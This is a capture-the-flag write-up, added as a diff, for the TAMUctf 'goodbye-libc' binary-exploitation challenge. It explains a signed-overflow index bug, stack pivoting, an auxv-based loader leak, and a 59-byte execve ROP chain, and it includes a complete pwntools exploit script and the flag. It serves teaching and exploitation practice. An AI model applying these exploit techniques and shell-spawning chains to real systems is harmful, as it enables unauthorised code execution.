@@ -1,0 +1,806 @@
+---
+title: 'Texas A&M University 2026 - Goodbye libc'
+description: 'A tiny calculator with a signed integer overflow in its index parser, stack frame migration, an auxv-derived loader leak, and a 59-byte execve chain.'
+date: 2026-03-21
+category: 'texas-am-university-2026'
+discipline: 'binary-exploitation'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: This writeup is archived from the original solve notes. I did not re-test the remote service while importing it here.
+
+# Decimal Digits, Negative Indices, and One Small Auxv Leak
+
+## Intro
+
+`goodbye-libc` looks small enough to be a warmup:
+
+1. a calculator
+2. only three numeric slots
+3. no libc import abuse beyond a tiny custom shared object
+
+But the bug is not in the arithmetic. It is in the index parser.
+
+Once that parser is understood, the challenge turns into a very clean stack exploitation exercise:
+
+1. abuse signed 32-bit overflow to synthesize negative indices using only decimal input
+2. get stable out-of-bounds stack read and write
+3. leak a stack pointer and a PIE pointer
+4. pivot the active frame into controlled stack space
+5. first solve locally with a synthetic `libbye` leak
+6. realize the remote startup stack is shifted
+7. recover by treating the synthetic leaks as auxv entries and using `AT_BASE`
+8. derive `libbye` from the loader base
+9. use a 59-byte stage so `read()` leaves `rax == 59`
+10. jump into `syscall` for `execve("/bin/sh", 0, 0)`
+
+The final remote flag was:
+
+```text
+gigem{flamepyromancer_didnt_change_the_default_flag}
+```
+
+## Challenge Information
+
+Category: Binary Exploitation  
+Event: TAMUctf (filed here under Texas A&M University 2026)  
+Target: `streams.tamuctf.com:443` with SNI `goodbye-libc`  
+Files: `goodbye-libc`, `libbye-libc.so`, `ld-linux-x86-64.so.2`, `goodbye-libc.c`, `bye-libc.c`, `bye-libc.h`
+
+The challenge directory contained the vulnerable program, the tiny helper library, the loader, and the source:
+
+```bash
+$ file goodbye-libc libbye-libc.so ld-linux-x86-64.so.2
+goodbye-libc:         ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=907dcd4587ab56b5c16b81b02ebded0268eb4e88, not stripped
+libbye-libc.so:       ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=23908d1eff9fb5de85730819b218b9453e36d55b, not stripped
+ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=6580196fa83df5c1edec10a57b2725eda6c73d7c, stripped
+```
+
+```bash
+$ checksec --file=goodbye-libc
+[*] './goodbye-libc'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'.'
+    Stripped:   No
+
+$ checksec --file=libbye-libc.so
+[*] './libbye-libc.so'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+The important takeaway was immediate:
+
+1. NX means I want ROP or syscalls, not injected code
+2. PIE means I need at least one code leak
+3. the program is tiny enough that stable stack corruption is probably the real path
+
+## Source Review
+
+The main binary is a simple calculator implemented directly in `_start`:
+
+```c
+int _start() {
+  int input;
+  unsigned long nums[3] = {0};
+
+  while (1) {
+    print_menu();
+    input = input_menu();
+    if (input == -1) continue;
+
+    switch (input) {
+    case WRITE_NUM:
+      print("Select index to write to [1-3]: ");
+      index = input_index();
+      write_num(&nums[index]);
+      break;
+
+    case PRINT_NUM:
+      print("Select index to read from [1-3]: ");
+      index = input_index();
+      if (index == -1) continue;
+      print("\nValue written: ");
+      print(long_to_str(nums[index]));
+      break;
+    }
+  }
+}
+```
+
+The helper library is intentionally minimal:
+
+```c
+int __attribute__((naked)) write(int, char*, int) {
+  asm ("push rbp\n\t"
+      "mov rbp, rsp\n\t"
+      "mov rax, 0x1\n\t"
+      "syscall\n\t"
+      "pop rbp\n\t"
+      "ret\n\t"
+  );
+}
+
+int __attribute__((naked)) read(int, char*, int) {
+  asm ("push rbp\n\t"
+      "mov rbp, rsp\n\t"
+      "mov rax, 0x0\n\t"
+      "syscall\n\t"
+      "pop rbp\n\t"
+      "ret\n\t"
+  );
+}
+```
+
+That looked promising for two reasons:
+
+1. `read()` returning directly into attacker-controlled stack is a natural second stage
+2. the shared object is so small that useful gadgets are easy to find
+
+`ROPgadget` confirmed that:
+
+```text
+0x000000000000102c : pop rbp ; ret
+0x000000000000103f : pop rdi ; pop rsi ; pop rdx ; ret
+0x0000000000001041 : pop rdx ; ret
+0x0000000000001040 : pop rsi ; pop rdx ; ret
+0x000000000000102d : ret
+0x0000000000001039 : syscall
+```
+
+The two gadgets that mattered in the end were:
+
+1. `libbye + 0x103f` for `pop rdi; pop rsi; pop rdx; ret`
+2. `libbye + 0x1039` for `syscall`
+
+## Root Cause: `input_index()` Accepts Negative Values Without a Minus Sign
+
+The vulnerability is in the index parser:
+
+```c
+int input_index() {
+  char input[16];
+
+  read(STDIN, input, 16);
+  int choice = 0;
+
+  for (int i = 0; i < 16; ++i) {
+    if (input[i] >= '0' && input[i] <= '9') {
+      choice = 10*choice + (input[i]-'0');
+    }
+    else {
+      break;
+    }
+  }
+
+  if (choice <= 3 && choice >= -2) {
+    return choice-1;
+  }
+  else {
+    print("Invalid index!\n\n");
+    return -1;
+  }
+}
+```
+
+At source level this looks like it only accepts `1`, `2`, or `3`.
+
+In practice, on this build, the 32-bit signed `int choice` wraps while parsing long decimal strings. That gives attacker-controlled negative values even though the function never accepts `-`.
+
+The important conversions were:
+
+```text
+4294967294 -> choice == -2 -> returned index == -3
+4294967295 -> choice == -1 -> returned index == -2
+4294967296 -> choice ==  0 -> returned index == -1
+```
+
+So decimal-only input becomes an out-of-bounds stack primitive:
+
+1. raw `4294967294` accesses `nums[-3]`
+2. raw `4294967295` accesses `nums[-2]`
+3. raw `4294967296` accesses `nums[-1]`
+
+That is the whole challenge.
+
+## First Stable Primitives
+
+The very first stable leaks were:
+
+```text
+print_idx(4294967294) -> stack pointer B0
+print_idx(4294967295) -> PIE leak
+pie = leak - 0x1cbd
+```
+
+Those two values were enough to start treating the stack as a relocatable structure.
+
+The other key offsets inside the PIE were:
+
+```text
+pop_rbp_ret = pie + 0x1158
+start_p4    = pie + 0x1550
+print_body  = pie + 0x1c7e
+read_plt    = pie + 0x1020
+```
+
+The final exploit used two nearby synthetic frames:
+
+```text
+F = B0 - 0x30
+R = B0 - 0x40
+S = B0 - 0x20
+```
+
+Conceptually the flow was:
+
+1. pivot from the original frame into `F`
+2. pivot again into `R`
+3. use the new `nums[]` interpretation there to leak or call `read`
+4. overwrite the post-`read` return path with a very small syscall chain
+
+## Local Solve Path
+
+Before touching remote, the local path was already stable.
+
+Under the host/system-loader layout, a synthetic leak at index `72` returned:
+
+```text
+lib_leak = libbye_base + 0xc000
+libbye_base = lib_leak - 0xc000
+```
+
+That made the local exploit very small:
+
+1. stage 1 pivots and calls `read(0, B0 - 0x40, 59)`
+2. stage 2 is exactly 59 bytes
+3. because `read()` returns `59`, `rax == 59`
+4. then `syscall` becomes `execve`
+
+The 59-byte stage was:
+
+```text
+[ pop rdi ; pop rsi ; pop rdx ; ret ]
+[ "/bin/sh" address                ]
+[ 0                                ]
+[ 0                                ]
+[ syscall                          ]
+[ "/bin/sh\x00"                    ]
+```
+
+This was small enough that nothing fancy was needed after the pivot.
+
+## Experiment Log
+
+This is the part that actually mattered during the solve. I am including the failed steps too, because the remote solve only became stable after rejecting a few wrong assumptions.
+
+### Experiment 1: Confirm the local primitive
+
+The first goal was simply to verify that the out-of-bounds reads were stable enough to be useful.
+
+Result:
+
+1. `4294967294` always gave a stack pointer-like value
+2. `4294967295` always gave a pointer inside the PIE
+3. the PIE leak stabilized at `leak - 0x1cbd`
+
+That was enough to stop worrying about the parser and start building a real exploit.
+
+### Experiment 2: Build a two-step frame migration locally
+
+The next experiment was whether the writable out-of-bounds slots were enough to pivot execution into nearby stack memory.
+
+The stable migration was:
+
+```text
+original frame -> F = B0 - 0x30 -> R = B0 - 0x40
+```
+
+Result:
+
+1. local frame migration was stable
+2. `print_body` could be re-entered with a controlled synthetic frame
+3. synthetic stack-slot leaks became possible
+
+That turned the exploit from "I can leak some stack words" into "I can make `_start` interpret attacker-chosen stack memory as its `nums[]` array".
+
+### Experiment 3: Map local synthetic leak slots
+
+I scanned the startup-stack tail under the system loader. The interesting part of the local map looked like this:
+
+```text
+ 72 0x00007ffff37b7258 0x000055ded3a47000 0x00007f411827f000
+ 76 0x00007ffda9614718 0x000055d828191000 0x00000000178bfbff
+ 80 0x00007ffeafde3d48 0x000055ac84553000 0x0000000000000064
+ 82 0x00007ffdb367dc78 0x0000562c66320000 0x0000562c66320040
+ 88 0x00007ffd1adfc5c8 0x000055ff587c8000 0x00007f2b736ba000
+```
+
+At the time, the important discovery was `72`.
+
+Result:
+
+1. slot `72` leaked a `0x7f...` pointer into the mapped runtime
+2. subtracting `0xc000` gave the correct `libbye` base locally
+3. the final `read(..., 59)` plus `syscall` chain worked locally
+
+This solved the local exploit.
+
+### Experiment 4: Replay the local `72` leak on remote
+
+This was the obvious next test:
+
+```text
+Use the same synthetic leak slot 72 on the remote service.
+```
+
+Result:
+
+1. it failed immediately
+2. remote `72` returned tiny constants such as `0x1c`
+3. the local synthetic slot map clearly did not match the remote one
+
+This was the real blocker.
+
+### Experiment 5: Chase the negative-index lead
+
+Before rebuilding the scanner, the early remote probing suggested that `-19` leaked a real `0x7f...` pointer.
+
+That led to the next hypothesis:
+
+```text
+Maybe the negative side of the synthetic frame is the right remote leak source.
+```
+
+I scanned the negative region more systematically later. The corrected results looked like:
+
+```text
+ -24 0x00007ffc42379118 0x0000561eb80bd000 0x0000000b0000000b
+ -23 0x00007ffd3dd64678 0x000055cd0905d000 0x0000000b0000000b
+ -22 0x00007ffcdf2a8d28 0x0000559600f5a000 0x0000000b0000000b
+ -21 0x00007ffc45dde358 0x000056073be6f000 0x0000000b0000000b
+ -20 0x00007ffe503ff498 0x000055fc6eef9000 0x0000000b0000000b
+ -19 0x00007ffc035078e8 0x00005600978dc000 0x0000000b0000000b
+ -18 0x00007ffe0700f118 0x000055b9626c4000 0x0000000b0000000b
+```
+
+Result:
+
+1. this was a dead end
+2. the early `-19` result was not a stable remote primitive
+3. after the scanner was fixed, the negative slots were not useful
+
+This was the first major wrong turn.
+
+### Experiment 6: First remote scanner using prompt-by-prompt interaction
+
+The first remote scanner used ordinary `sendlineafter()` style interaction for every menu step.
+
+That looked reasonable, but the program uses fixed-size `read()` calls:
+
+```c
+read(STDIN, input, 16);
+read(STDIN, input, 64);
+```
+
+Result:
+
+1. the brute-force runs were slow
+2. some scans stalled
+3. a few observed values were inconsistent enough to poison the hypothesis space
+
+This was not a target bug. It was a tooling bug.
+
+### Experiment 7: Rewrite the probe transport to match the program's `read()` sizes
+
+The fix was to stop talking to the service like a normal line-oriented menu and instead send exact field-sized chunks:
+
+```python
+def field(value, size):
+    data = str(value).encode() + b"\n"
+    return data.ljust(size, b"A")
+
+def op_print(raw_index):
+    return field(6, 16) + field(raw_index, 16)
+
+def op_write(raw_index, value):
+    return field(1, 16) + field(raw_index, 16) + field(value, 64)
+```
+
+This aligned perfectly with the target's `read(16)` and `read(64)` boundaries.
+
+Result:
+
+1. scanning became deterministic
+2. false leads disappeared
+3. remote leak mapping became fast enough to brute force
+
+This was the turning point for the remote solve.
+
+### Experiment 8: Scan the positive remote startup-stack tail
+
+Once the transport was fixed, the positive region finally started making sense.
+
+The important remote excerpt was:
+
+```text
+ 31 0x00007ffe1c821d08 0x0000561ed1895000 0x0000000000000021
+ 32 0x00007ffcc12ee648 0x000055abf5d7a000 0x00007fcef06a4000
+ 33 0x00007ffe33125458 0x000055ebaed20000 0x0000000000000033
+ 34 0x00007ffc497a9cf8 0x0000561587182000 0x0000000000000e30
+ 35 0x00007ffefc469ca8 0x0000559b3f091000 0x0000000000000010
+ 36 0x00007ffd9f05fa78 0x0000558c98d06000 0x000000000fabfbff
+ 37 0x00007fff603c5178 0x000055ae392c4000 0x0000000000000006
+ 38 0x00007ffcab87ecf8 0x000056127c107000 0x0000000000001000
+ 39 0x00007ffc462a6278 0x000055ee7cf09000 0x0000000000000011
+ 40 0x00007ffec66b1a48 0x00005616f1729000 0x0000000000000064
+ 41 0x00007ffed8fca8c8 0x000055fcac34d000 0x0000000000000003
+ 42 0x00007ffcf8d77978 0x000055800c4f4000 0x000055800c4f4040
+ 43 0x00007ffe1402f188 0x00005558060ff000 0x0000000000000004
+ 44 0x00007fff3e1ed248 0x00005636a1d13000 0x0000000000000038
+ 45 0x00007ffebc9b4d88 0x0000557d5399f000 0x0000000000000005
+ 46 0x00007ffc85d6cbf8 0x000055c76cd87000 0x000000000000000b
+ 47 0x00007ffd141b8ef8 0x000056421dc34000 0x0000000000000007
+ 48 0x00007fff789209a8 0x000055db149fe000 0x00007f88f9754000
+ 49 0x00007ffc5c75dce8 0x000055d421144000 0x0000000000000008
+```
+
+This is where the exploit really unlocked.
+
+Those numbers are not random. They are auxv tags and values:
+
+1. `37 -> 6`, `38 -> 0x1000` means `AT_PAGESZ`
+2. `41 -> 3`, `42 -> pie + 0x40` means `AT_PHDR`
+3. `43 -> 4`, `44 -> 0x38` means `AT_PHENT`
+4. `45 -> 5`, `46 -> 0xb` means `AT_PHNUM`
+5. `47 -> 7`, `48 -> 0x7f...` means `AT_BASE`
+
+Result:
+
+1. the remote synthetic leaks were not "different random stack words"
+2. they were a shifted view of the startup auxiliary vector
+3. `48` was exactly the loader base
+
+That replaced the broken "find the remote version of local slot 72" plan with a better plan:
+
+```text
+Use AT_BASE directly.
+```
+
+### Experiment 9: Derive `libbye` from `AT_BASE`
+
+On the host/system-loader layout, `libbye` sits `0xe000` below the loader base.
+
+So the remote formula became:
+
+```text
+AT_BASE   = synthetic_leak(48)
+libbye    = AT_BASE - 0xe000
+```
+
+This was enough to rebuild the exact same tiny syscall stage that was already working locally.
+
+Result:
+
+1. the loader leak gave a stable remote base
+2. no further remote slot hunting was needed
+3. the final local and remote payload could share the same second stage
+
+### Experiment 10: Fire the final remote chain
+
+The final remote run was:
+
+```bash
+$ python solve.py REMOTE CMD='pwd; ls; cat flag*'
+[*] B0      = 0x7fffd4a64998
+[*] PIE     = 0x564fe05b0000
+[*] AT_BASE = 0x7f5432be1000
+[*] libbye  = 0x7f5432bd3000
+...
+/pwn
+docker_entrypoint.sh
+flag.txt
+goodbye-libc
+libbye-libc.so
+gigem{flamepyromancer_didnt_change_the_default_flag}
+```
+
+That was the end of the challenge.
+
+## Why the Final Chain Is So Small
+
+The best part of this exploit is the last stage.
+
+Stage 1 does:
+
+```text
+read(0, B0 - 0x40, 59)
+```
+
+Stage 2 is exactly 59 bytes long, written directly over the post-`read` return path.
+
+Because `read()` returns `59`, the kernel leaves:
+
+```text
+rax = 59
+```
+
+On amd64 Linux, syscall number `59` is `execve`.
+
+So the second stage only needs to set:
+
+```text
+rdi = "/bin/sh"
+rsi = 0
+rdx = 0
+```
+
+Then jump into a plain `syscall`.
+
+The chain is:
+
+```text
+libbye + 0x103f  -> pop rdi ; pop rsi ; pop rdx ; ret
+binsh_ptr
+0
+0
+libbye + 0x1039  -> syscall
+"/bin/sh\x00"
+```
+
+That is why the exploit remained compact even after the remote leak logic changed.
+
+## Final Exploit Logic
+
+The final remote-capable solver was:
+
+1. bootstrap with raw indices `4294967294` and `4294967295`
+2. compute `B0` and `PIE`
+3. pivot into synthetic frames at `B0 - 0x30` and `B0 - 0x40`
+4. leak `AT_BASE` using synthetic slot `48` on remote
+5. derive `libbye = AT_BASE - 0xe000`
+6. queue `read(0, B0 - 0x40, 59)`
+7. send the 59-byte syscall chain
+8. run shell commands to read the flag
+
+In pseudocode:
+
+```text
+B0  = leak_stack_ptr()
+PIE = leak_pie() - 0x1cbd
+
+AT_BASE = synthetic_leak(idx=48)
+libbye  = AT_BASE - 0xe000
+
+queue_read(fd=0, buf=B0-0x40, size=59)
+send_59_byte_execve_chain(libbye, B0-0x40)
+```
+
+## Full Exploit Code
+
+I attached the final solver as [solve.py](./solve.py). This is the exact script that solved the remote service:
+
+```python
+from time import sleep
+
+from pwn import *
+
+
+context.binary = exe = ELF("./goodbye-libc", checksec=False)
+context.arch = "amd64"
+
+HOST = "streams.tamuctf.com"
+PORT = 443
+SNI = "goodbye-libc"
+
+LOCAL_AT_BASE_IDX = 88
+REMOTE_AT_BASE_IDX = 48
+AT_BASE_TO_LIBBYE = 0xE000
+
+
+def start():
+    if args.REMOTE:
+        return remote(HOST, PORT, ssl=True, sni=SNI)
+
+    return process("./goodbye-libc")
+
+
+def field(value, size):
+    data = str(value).encode() + b"\n"
+    if len(data) > size:
+        raise ValueError(f"{value} does not fit in {size} bytes")
+    return data.ljust(size, b"A")
+
+
+def op_print(raw_index):
+    return field(6, 16) + field(raw_index, 16)
+
+
+def op_write(raw_index, value):
+    return field(1, 16) + field(raw_index, 16) + field(value, 64)
+
+
+def recv_value(io):
+    io.recvuntil(b"Value written: ")
+    return int(io.recvline().strip())
+
+
+def bootstrap(io):
+    io.recvuntil(b"Enter input: ")
+    io.send(op_print(4294967294) + op_print(4294967295))
+    b0 = recv_value(io)
+    pie = recv_value(io) - 0x1CBD
+    return b0, pie
+
+
+def synthetic_leak(io, b0, pie, index):
+    frame_f = b0 - 0x30
+    frame_r = b0 - 0x40
+    pop_rbp_ret = pie + 0x1158
+    start_p4 = pie + 0x1550
+    print_body = pie + 0x1C7E
+
+    io.send(
+        b"".join(
+            [
+                op_write(4294967296, frame_f),
+                op_write(1, start_p4),
+                op_write(4294967295, pop_rbp_ret),
+                op_write(3, index),
+                op_write(4294967296, frame_r),
+                op_write(1, print_body),
+                op_write(4294967295, pop_rbp_ret),
+            ]
+        )
+    )
+    return recv_value(io)
+
+
+def build_stage2(b0, lib_base):
+    start = b0 - 0x40
+    binsh = start + 0x28
+    buf = bytearray()
+    buf += p64(lib_base + 0x103F)
+    buf += p64(binsh)
+    buf += p64(0)
+    buf += p64(0)
+    buf += p64(lib_base + 0x1039)
+    buf += b"/bin/sh\x00"
+    buf += b"P" * (59 - len(buf))
+    return bytes(buf)
+
+
+def queue_final_read(io, b0, pie):
+    frame_s = b0 - 0x20
+    read_plt = pie + 0x1020
+
+    io.send(
+        b"".join(
+            [
+                op_write(2, frame_s),
+                op_write(4294967296, 0),
+                op_write(1, b0 - 0x40),
+                op_write(2, 59),
+                op_write(3, read_plt),
+            ]
+        )
+    )
+
+
+def fire_stage2(io, b0, lib_base):
+    stage2 = build_stage2(b0, lib_base)
+    pop_rdi_rsi_rdx_ret = lib_base + 0x103F
+
+    io.send(field(1, 16) + field(4294967295, 16) + field(pop_rdi_rsi_rdx_ret, 64))
+    sleep(0.2 if args.REMOTE else 0.05)
+    io.send(stage2)
+
+
+def post_stage_delay():
+    sleep(0.2 if args.REMOTE else 0.05)
+
+
+def exploit(io):
+    b0, pie = bootstrap(io)
+    at_base_idx = REMOTE_AT_BASE_IDX if args.REMOTE else LOCAL_AT_BASE_IDX
+    at_base = synthetic_leak(io, b0, pie, at_base_idx)
+    lib_base = at_base - AT_BASE_TO_LIBBYE
+
+    log.info("B0      = %#x", b0)
+    log.info("PIE     = %#x", pie)
+    log.info("AT_BASE = %#x", at_base)
+    log.info("libbye  = %#x", lib_base)
+
+    queue_final_read(io, b0, pie)
+    fire_stage2(io, b0, lib_base)
+
+
+def main():
+    io = start()
+    exploit(io)
+    post_stage_delay()
+
+    if args.CMD:
+        io.sendline(args.CMD.encode())
+        data = io.recvrepeat(2)
+        if data:
+            print(data.decode("latin-1", errors="replace"), end="")
+        return
+
+    io.sendline(b"echo PWNED")
+    try:
+        line = io.recvline(timeout=2)
+        log.info("shell test: %r", line)
+    except EOFError:
+        log.warning("no immediate shell response")
+
+    io.sendline(b"ls")
+    io.sendline(b"cat flag*")
+    io.interactive(prompt=b"")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Important Debug Lesson
+
+The most important failure in this challenge was not a bad gadget or a bad offset.
+
+It was trusting the first remote scanner too early.
+
+The useful lesson was:
+
+1. when the target uses fixed-size `read()` calls, shape your exploit traffic around those reads
+2. if a leak map feels inconsistent, debug your transport before debugging the target
+3. startup-stack leaks often become much easier once you recognize auxv patterns instead of treating every value as an isolated mystery pointer
+
+The final remote solve did not come from finding a magic replacement for local slot `72`.
+
+It came from realizing the remote stack was showing me auxv, then using `AT_BASE`.
+
+## Flag
+
+```text
+gigem{flamepyromancer_didnt_change_the_default_flag}
+```
+
+## Closing
+
+This challenge ended up being a good reminder that tiny binaries can still have a lot of structure hiding in the startup stack.
+
+The clean solve path was:
+
+1. understand the signed overflow in `input_index()`
+2. turn it into stable stack read and write
+3. stop treating the remote synthetic leaks as arbitrary stack garbage
+4. recognize auxv
+5. use `AT_BASE`
+6. keep the second stage tiny
+
+The failed experiments were still useful:
+
+1. local slot `72` proved the exploitation concept
+2. the false `-19` lead forced the scanner rewrite
+3. the rewritten transport made the remote stack map readable
+
+That is the part worth remembering for the next challenge.
+
+## References
+
+- Challenge source: [goodbye-libc.c](./goodbye-libc.c), [bye-libc.c](./bye-libc.c), [bye-libc.h](./bye-libc.h), [libbye-libc.so](./libbye-libc.so), [ld-linux-x86-64.so.2](./ld-linux-x86-64.so.2)
+- Exploit reference implementation: [solve.py](./solve.py)
+- System V ABI ELF specification: [ELF specification](https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html)
+- Linux auxiliary vector documentation: [getauxval(3)](https://man7.org/linux/man-pages/man3/getauxval.3.html)
+- Linux `execve(2)` man page: [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)
+- Pwntools documentation: [Pwntools docs](https://docs.pwntools.com/)
+- ROPgadget repository: [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
